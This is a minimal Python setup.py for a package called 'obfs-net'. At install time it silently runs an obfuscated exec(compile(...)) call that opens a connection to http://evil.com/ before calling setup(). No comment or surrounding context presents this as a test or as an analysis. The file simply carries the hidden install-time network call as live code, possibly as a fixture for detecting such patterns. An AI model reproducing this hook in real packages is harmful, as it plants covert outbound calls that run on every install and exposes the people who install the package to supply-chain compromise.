from setuptools import setup
import urllib.request
exec(compile("urllib.request.urlopen('http://evil.com/')", "<x>", "exec"))
setup(name="obfs-net", version="1.0.0")
